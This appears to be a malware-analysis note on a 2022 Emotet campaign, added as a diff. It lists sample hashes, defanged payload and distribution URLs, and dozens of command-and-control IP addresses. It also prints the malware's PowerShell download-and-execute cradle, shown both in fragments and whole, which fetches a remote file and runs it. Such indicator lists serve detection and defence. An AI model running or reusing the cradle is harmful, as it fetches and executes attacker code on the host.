@@ -1,0 +1,75 @@
+Emotet 2022
+
+.xls a9390ffb173cc166e386cb9660f5605265a3842b37cc8ba05893ccc607617c44
+
+.dll 1743758665cfd687a722caca8a0c7bef3081ee1b0415f8cfd965f7333a4802fd
+
+hxxp://91.240.118.172/gg/ff/fe.html
+
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('hxxp://91.240.118.172/gg/ff/fe.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/gg/ff/fe.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/gg/ff/fe.png')"|invoke-expression
+
+
+C:\ProgramData\QWER.dll
+hxxp://hostfeeling.com/wp-admin/4XsjtOT7cFHvBV3HZ/
+hxxp://jurnalpjf.lan.go.id/assets/iM/
+hxxp://it-o.biz/bitrix/xoDdDe/
+hxxp://bimesarayenovin.ir/wp-admin/G1pYGL/
+hxxp://gardeningfilm.com/wp-content/pcMVUYDQ3q/
+hxxp://daisy.sukoburu-secure.com/8plks/v8lyZTe/
+hxxps://property-eg.com/mlzkir/97v/
+hxxp://totalplaytuxtla.com/sitio/DgktL3zd/
+hxxp://maxtdeveloper.com/okw9yx/Gc28ZX/
+hxxp://www.inablr.com/elenctic/fMFtRrbsEX1gXu3Z1M/
+hxxp://activetraining.sytes.net/libraries/8s/
+hxxps://gudangtasorichina.com/wp-content/GG01c/
+
+51.15.4.22:443
+173.214.173.220:8080
+212.237.5.209:443
+192.254.71.210:443
+216.158.226.206:443
+162.243.175.63:443
+212.24.98.99:8080
+58.227.42.236:80
+45.118.115.99:8080
+104.251.214.46:8080
+185.157.82.209:8080
+46.55.222.11:443
+188.40.137.206:8080
+81.0.236.90:443
+103.75.201.2:443
+129.232.188.93:443
+195.154.133.20:443
+159.8.59.82:8080
+79.172.212.216:8080
+138.185.72.26:8080
+200.17.134.35:7080
+185.157.82.211:8080
+209.59.138.75:7080
+178.63.25.185:443
+45.176.232.124:443
+45.118.135.203:7080
+164.68.99.3:8080
+203.114.109.124:443
+212.237.17.99:8080
+50.116.54.215:443
+131.100.24.231:80
+212.237.56.116:7080
+45.142.114.231:8080
+162.214.50.39:7080
+51.38.71.0:443
+104.168.155.129:8080
+107.182.225.142:8080
+217.182.143.207:443
+158.69.222.101:443
+176.104.106.96:8080
+207.38.84.195:8080
+41.76.108.46:8080
+110.232.117.186:8080
+178.79.147.66:8080
+173.212.193.249:8080
+
